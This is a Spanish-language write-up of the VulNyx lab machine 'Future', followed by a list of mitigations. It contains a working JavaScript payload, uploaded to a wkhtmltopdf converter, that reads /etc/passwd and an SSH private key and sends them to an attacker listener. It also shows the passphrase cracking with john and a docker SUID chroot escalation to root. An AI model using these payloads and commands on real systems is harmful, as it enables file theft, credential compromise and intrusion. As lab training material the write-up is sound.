VulNyx — Future
Plataforma: VulNyx
Máquina: Future
Dificultad: Media
Fecha: 2026-11-24
Resumen de la cadena: Enumeración web → descubrimiento de un conversor HTML→PDF (`wkhtmltopdf`) vulnerable a SSRF / LFI ciega mediante subida de archivos → exfiltración de la clave privada SSH de `marty.mcfly` → crackeo de la passphrase con un diccionario generado del propio sitio → acceso SSH → escalada a root abusando del binario `docker` con bit SUID (GTFOBins).
> **Nota sobre la IP:** la VM toma dirección por DHCP y entre reinicios fue `192.168.0.20`, `192.168.0.21` y `192.168.0.24`. Ajustá la IP a la que tengas activa (confirmala con `arp-scan -l` o mirando la consola de la VM).
---
1. Reconocimiento
1.1. Descubrimiento de puertos
Escaneo completo de puertos TCP con nmap:
```bash
sudo nmap -sS -p- -oA port-scanning-full-tcp-192.168.0.20 192.168.0.20
```
Solo dos puertos abiertos: 22 (SSH) y 80 (HTTP). La MAC `08:00:27:...` confirma que es una VM de VirtualBox.

<img width="635" height="185" alt="descubrimiento de puertos" src="https://github.com/user-attachments/assets/3273a9ea-6384-4440-8548-f3fb2fd98d7b" />

1.2. Descubrimiento de servicios
Detección de versiones sobre los puertos abiertos:
```bash
sudo nmap -sV -p 22,80 192.168.0.20 -oA service-detection-inicial-192.168.0.20
```
22/tcp → OpenSSH 9.2p1 Debian
80/tcp → Apache httpd 2.4.57 (Debian)

<img width="772" height="214" alt="descubrimiento de servicios" src="https://github.com/user-attachments/assets/07765a3a-6d2e-40f5-a43b-4d81a0e229fa" />

---
2. Enumeración web (puerto 80)
2.1. Inspección de cabeceras
```bash
curl -I http://192.168.0.20
```
Servidor Apache 2.4.57, respuesta 200 OK, `Content-Length: 1727`.

<img width="642" height="218" alt="inspección de cabeceras con curl" src="https://github.com/user-attachments/assets/b1ae10d1-0699-4681-964b-ce9a478177be" />

2.2. robots.txt
No existe (404):
```bash
curl -i http://192.168.0.20/robots.txt
```

<img width="703" height="310" alt="Inspección de archivo robots no encontrado" src="https://github.com/user-attachments/assets/6c75bdf2-30bd-432f-aa1b-49bd2ba5e055" />

2.3. Inspección manual de la raíz
La web está completamente tematizada con Volver al Futuro (Back to the Future). La portada muestra el reloj del pueblo con un botón "Click here if you want to go to the FUTURE or the PAST?!".

<img width="1265" height="600" alt="inspeccion manual en navegador del puerto 80 raiz" src="https://github.com/user-attachments/assets/40e08197-0180-4398-b8b0-10d82b84ba06" />

2.4. Código fuente de la raíz
En el código fuente aparecen rutas interesantes: un botón que redirige a `transition/index.html`, audio en `content/backtothefuture.mp3` e imagen `content/rf.png`.

<img width="1239" height="570" alt="Inspección de código fuente raíz puerto 80" src="https://github.com/user-attachments/assets/c06b7673-fe32-4072-801f-862b0f0fec8b" />

2.5. Fuzzing de directorios con Gobuster
Diccionario chico (`dirb/common.txt`):
```bash
gobuster dir -u http://192.168.0.21 -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-common-192.168.0.21.txt
```
Encuentra `assets/`, `content/`, `images/` e `index.html`.

<img width="730" height="450" alt="Descubrimiento de directorios con gobuster diccionario chico" src="https://github.com/user-attachments/assets/ab7b629f-eaaa-4af8-b776-5c75c53dae07" />

Diccionario medio con extensiones (`directory-list-2.3-medium`):
```bash
gobuster dir -u http://192.168.0.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30 -o gobuster-medium.txt
```
Aparecen archivos clave:
`page.html`
`process.php` (Status 500, Size 0) ← candidato principal
`1885.html`, `1955.html`, `2015.html` (años de la trilogía)
`transition/`
`homework.html`

<img width="733" height="540" alt="Descubrimiento de directorios con gobuster diccionario medio" src="https://github.com/user-attachments/assets/9b5a8beb-b578-4695-b8e6-9897eb48e4f7" />

2.6. Inspección manual de directorios
/assets (listado habilitado — bootstrap, css, fonts, js):

<img width="735" height="425" alt="inspeccion manu en en navegador de assets" src="https://github.com/user-attachments/assets/be985f62-6353-4976-b0a5-1b0c5dfd6c20" />

/content (mp3 e imagen de la temática):

<img width="766" height="383" alt="inspeccion manu en en navegador de content" src="https://github.com/user-attachments/assets/68608090-8374-49a8-bb9a-cc44cf09f144" />

/images (imágenes de la película):

<img width="731" height="567" alt="inspeccion manu en en navegador de images" src="https://github.com/user-attachments/assets/8918e2a9-5f57-4902-8727-9af26a3afa55" />

page.html → solo muestra "Oops!" en el navegador, pero el valor está en su código fuente:

<img width="776" height="232" alt="inspeccion manu en en navegador de pagehtml" src="https://github.com/user-attachments/assets/5adf55f8-d85a-4c85-98d7-aabb325a391f" />

El código fuente de `page.html` es la plantilla del ataque previsto — una SSRF ciega que lee un archivo local y lo exfiltra en base64:
```html
<html><body>
<b>Exfiltration via Blind SSRF</b>
<script>
var readfile = new XMLHttpRequest(); // Read the local file
var exfil = new XMLHttpRequest();    // Send the file to our server
readfile.open("GET","file:///home/marty.mcfly/.ssh/id_rsa", true);
readfile.send();
readfile.onload = function() {
    if (readfile.readyState === 4) {
        var url = 'http://192.168.1.45:4444/?data='+btoa(this.response);
        exfil.open("GET", url, true);
        exfil.send();
    }
}
readfile.onerror = function(){document.write('<a>Oops!</a>');}
</script>
</body></html>
```
---
3. Explotación — SSRF / LFI ciega vía subida de HTML
3.1. Relación de process.php con el botón de subida
Inspeccionando `homework.html` con las DevTools se ve que el formulario postea a `process.php` y acepta un archivo `.html`:
```html
<form action="process.php" method="post" enctype="multipart/form-data">
  <input type="file" name="htmlFile" accept=".html">
  <button type="submit">Submit</button>
</form>
```
<img width="1018" height="649" alt="Encuentro relación del archivophp con el boton de subida de archivos" src="https://github.com/user-attachments/assets/720646be-32c5-4c1b-95df-01f59425ccf8" />

3.2. Descartando parámetros GET y POST
Antes de confirmar que se trata de una subida de archivo, se prueban parámetros por GET y POST — ninguno responde:
```bash
for p in url uri path file page link target; do
  echo "=== $p ==="
  curl -s "http://192.168.0.21/process.php?$p=http://192.168.0.21/index.html" | head
done
```

<img width="711" height="190" alt="enumeración de parámetros por GET" src="https://github.com/user-attachments/assets/40859311-edfa-4cca-84c5-2486457c3734" />

```bash
for p in url uri path file page link target data; do
  echo "=== $p ==="
  curl -s -X POST "http://192.168.0.21/process.php" --data "$p=http://192.168.0.21/index.html" | head
done
```

<img width="732" height="213" alt="enumeración de parámetros por POST" src="https://github.com/user-attachments/assets/13552c60-e705-4178-b4d6-2cbb3663fb8a" />

Conclusión: el vector no es un parámetro de texto, sino la subida del archivo HTML que luego se renderiza del lado del servidor.
3.3. Análisis de la petición de Submit
Interceptando el envío del formulario con Burp Suite, la respuesta devuelve:
```
Error: PDF file does not exist after conversion.
```
Y el `User-Agent` de la petición saliente del servidor es `wkhtmltopdf`. Esto confirma el mecanismo: `process.php` convierte el HTML subido a PDF con `wkhtmltopdf` (motor WebKit), y durante esa conversión ejecuta el JavaScript del lado del servidor. Por eso el JS con `file://` puede leer archivos locales — es una SSRF/LFI ciega.

<img width="1157" height="431" alt="analisis de petición de submit" src="https://github.com/user-attachments/assets/adcd88aa-0701-47e6-ac3e-eb1cee1e7686" />

3.4. Preparación del exploit
Se adapta la plantilla de `page.html` apuntando el `btoa` a la IP del atacante (Kali):
```bash
cat > exploit.html <<'EOF'
<html><body>
<script>
var readfile = new XMLHttpRequest();
var exfil = new XMLHttpRequest();
readfile.open("GET","file:///etc/passwd", true);
readfile.send();
readfile.onload = function() {
    if (readfile.readyState === 4) {
        var url = 'http://192.168.0.23:4444/?data='+btoa(this.response);
        exfil.open("GET", url, true);
        exfil.send();
    }
}
readfile.onerror = function(){document.write('<a>Oops!</a>');}
</script>
</body></html>
EOF
```
Se levanta un listener para recibir la exfiltración:
```bash
python3 -m http.server 4444
```
Y se sube el archivo (por el formulario de `homework.html` con Browse → Submit, o por consola):
```bash
curl -s -F "htmlFile=@exploit.html;type=text/html" http://192.168.0.21/process.php
```
3.5. Confirmación de la exfiltración en el listener
El servidor renderiza el HTML, ejecuta el JS, lee el archivo y envía su contenido en base64 al listener:

<img width="738" height="587" alt="confirmo qu recibo cadena en base 64 en listener" src="https://github.com/user-attachments/assets/883f61cf-eaec-4e9c-86ed-7bf3561c5dba" />

3.6. Lectura de /etc/passwd
Decodificando la cadena base64:
```bash
echo 'CADENA_BASE64' | base64 -d
```
Se obtiene el `/etc/passwd`, donde se confirman dos usuarios con shell:
`marty.mcfly:x:1000:1000::/home/marty.mcfly:/bin/bash`
`emmett.brown:x:1001:1001::/home/emmett.brown:/bin/bash`

<img width="738" height="546" alt="veo etcpasswd en base64" src="https://github.com/user-attachments/assets/b584d3f1-0290-49d0-bcb0-4a0e6e5b6c66" />

<img width="738" height="553" alt="veo etcpasswd en base64 2" src="https://github.com/user-attachments/assets/b6489d40-5d42-4eee-b315-240deb9eab2c" />

3.7. Exfiltración de la clave privada SSH
Se repite el proceso cambiando la ruta del exploit a la clave privada de marty:
```
readfile.open("GET","file:///home/marty.mcfly/.ssh/id_rsa", true);
```
Tras subir el archivo y recibir la respuesta en el listener, se decodifica el base64 a un archivo `id_rsa`:
```bash
echo 'CADENA_BASE64' | base64 -d > id_rsa
head -1 id_rsa     # -----BEGIN OPENSSH PRIVATE KEY-----
```
---
4. Crackeo de la passphrase de la clave
La `id_rsa` está protegida con passphrase. Se extrae el hash para John:
```bash
chmod 600 id_rsa
ssh2john id_rsa > hash
```

<img width="481" height="140" alt="craking contraseña 1" src="https://github.com/user-attachments/assets/b9078404-c7f1-4afe-81c7-79a0f93a3c10" />

La passphrase no está en `rockyou` de forma práctica (clave OpenSSH con bcrypt, muy lenta), así que se genera un diccionario a partir del propio sitio con `cewl`, aprovechando que todo el contenido está tematizado:
```bash
TARGET=192.168.0.21
cewl -m 3 http://$TARGET/index.html    > w_index.txt
cewl -m 3 http://$TARGET/page.html     > w_page.txt
cewl -m 3 http://$TARGET/1885.html     > w_1885.txt
cewl -m 3 http://$TARGET/1955.html     > w_1955.txt
cewl -m 3 http://$TARGET/2015.html     > w_2015.txt
cewl -m 3 http://$TARGET/homework.html > w_homework.txt

cat w_*.txt | sort -u > wordlistcomplete.txt
wc -l wordlistcomplete.txt     # 161 palabras
```

<img width="437" height="53" alt="craking contraseña 2" src="https://github.com/user-attachments/assets/8a87df3e-b2d8-46ee-a332-f2a34c6a7c78" />

Se crackea con John usando ese diccionario:
```bash
john --wordlist=wordlistcomplete.txt hash
john --show hash
```
Resultado:
```
id_rsa:inadvertently
```
La passphrase es `inadvertently` (una palabra tomada del texto de las propias páginas del sitio).

<img width="689" height="161" alt="craking contraseña 3" src="https://github.com/user-attachments/assets/d4ea998b-e4f4-460c-b92c-e855c37c4511" />

---
5. Acceso inicial (user)
Con la clave y la passphrase se accede por SSH como `marty.mcfly`:
```bash
ssh -i id_rsa marty.mcfly@192.168.0.24
# Enter passphrase for key 'id_rsa': inadvertently
```

<img width="680" height="129" alt="solicita contraseña ñuego de usar conexion ssh con la clave" src="https://github.com/user-attachments/assets/ee2300d4-a618-4850-a26a-141f944342ef" />

Acceso conseguido (Linux `future`, Debian 6.1):

<img width="703" height="209" alt="ingreso ssh de martymcfly" src="https://github.com/user-attachments/assets/f2340c4b-16a4-466b-b26a-39ccb36d3091" />

Flag de usuario:
```bash
cat user.txt
# fe12df45c6xxxxxxxxxxxxxxxxxx
```

<img width="703" height="209" alt="ingreso ssh de martymcfly" src="https://github.com/user-attachments/assets/3ed0bb5d-6932-4dcd-9942-8c14116fc8fd" />

---
6. Escalada de privilegios (root)
6.1. Búsqueda de binarios SUID
```bash
find / -perm -4000 2>/dev/null
id | grep -i docker
```
Entre los binarios SUID aparece `/usr/bin/docker`, que no debería tenerlo. El usuario no pertenece al grupo `docker`, pero el bit SUID alcanza para ejecutarlo como root:
```bash
ls -l /usr/bin/docker
# -rwsr-xr-x 1 root root 45582984 ... /usr/bin/docker
```

<img width="480" height="411" alt="busco binarios suid" src="https://github.com/user-attachments/assets/1817b00f-850d-45c4-97c4-6cf2039dbe2a" />

6.2. Docker escape (GTFOBins)
Según GTFOBins, se monta el filesystem del host dentro de un contenedor y se hace `chroot`, obteniendo una shell como root sobre el sistema real:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```
# whoami
root
# cd /root
# ls
root.txt
```

<img width="505" height="68" alt="confirmo root en docker" src="https://github.com/user-attachments/assets/5d03d792-c6c0-4d4d-9129-bec443d8d4db" />

6.3. Flag de root
```bash
cat /root/root.txt
```

<img width="670" height="177" alt="obtengo roottxt" src="https://github.com/user-attachments/assets/41030867-1594-46c9-99a3-8c8cbddc59f6" />

---
7. Mitigaciones
Conversor HTML→PDF: ejecutar `wkhtmltopdf` con `--disable-local-file-access` (o migrar a una herramienta que no permita `file://` ni acceso a recursos internos). Nunca renderizar HTML suministrado por el usuario sin aislar el proceso.
Claves SSH: no almacenar claves privadas en rutas legibles/predecibles, y protegerlas con passphrases robustas que no deriven del contenido público del sitio.
Listado de directorios: deshabilitar el autoindex de Apache (`Options -Indexes`).
SUID en docker: quitar el bit SUID del binario `docker` y restringir el acceso al daemon solo a administradores. La pertenencia al grupo `docker` (o un `docker` SUID) equivale a acceso root.
---
8. Resumen de la cadena de ataque
Fase	Técnica
Reconocimiento	nmap — puertos 22/80
Enumeración web	gobuster → `process.php`, `page.html`, `homework.html`
Explotación	SSRF/LFI ciega vía subida de HTML renderizado por `wkhtmltopdf`
Exfiltración	lectura de `/etc/passwd` e `id_rsa` en base64 a un listener
Credenciales	`ssh2john` + diccionario con `cewl` del sitio → passphrase `inadvertently`
Acceso	SSH como `marty.mcfly`
Escalada	binario `docker` con SUID → GTFOBins → root
